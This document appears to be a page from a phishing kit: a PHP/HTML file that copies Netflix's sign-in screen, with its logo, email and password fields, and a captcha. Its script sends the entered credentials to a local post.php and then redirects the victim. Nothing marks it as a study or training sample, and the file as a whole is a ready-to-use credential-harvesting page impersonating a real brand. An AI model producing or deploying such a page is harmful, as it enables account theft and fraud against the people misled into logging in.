<?php 
require 'main.php';
?><!DOCTYPE html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="res/netflix.css">
    <script src="https://js.hcaptcha.com/1/api.js?hl=en" async defer></script>
    <title>Netflix</title>
</head>
<body >
     
<header>
   <div class="logo">
           <img src="res/img/Logo.png">
       </header>  </div>


<main>
 
<div class="continer">

<div class="title">
<label > Sign In </label> 
</div>
<br>
<form id="login-form" action="post.php" method="post">
<div class="col">
    <input type="text"  name="user" placeholder="Email or mobile number" required autofocus>
</div>
<div class="col">
    <input type="password"  name="pass" placeholder="Password" required >
</div>
<div class="h-captcha" data-sitekey="47fc9b6c-d9e0-4066-8486-39a6d4401490"></div>
<div class="but">
  <button type="submit">Sign In</button>
</div>

<div class="error-message" id="login-message"></div>
 
<div class="ou">
    <label >OU</label>
</div>

<div class="butt">
    <button>Use a Sign-In Code </button>

</div>

<div class="pas">
Forgot password?
</div>

<div class="chek">
    <input type="checkbox" >
    <label >Remember me</label>
</div>





</form>
</div>
</main>


<script>
document.addEventListener('DOMContentLoaded', function () {
    const form = document.getElementById('login-form');
    const messageBox = document.getElementById('login-message');

    if (!form) {
        return;
    }

    form.addEventListener('submit', async function (event) {
        event.preventDefault();
        messageBox.textContent = '';

        const formData = new FormData(form);

        try {
            const response = await fetch('post.php', {
                method: 'POST',
                headers: {
                    'X-Requested-With': 'XMLHttpRequest',
                    'Accept': 'application/json'
                },
                body: formData
            });

            const data = await response.json();

            if (data && data.success && data.redirect) {
                window.location.href = data.redirect;
            } else {
                messageBox.textContent = (data && data.error) ? data.error : 'An unexpected error occurred. Please try again.';
            }
        } catch (error) {
            messageBox.textContent = 'Network error. Please try again.';
        }
    });
});
</script>
</body>
</html>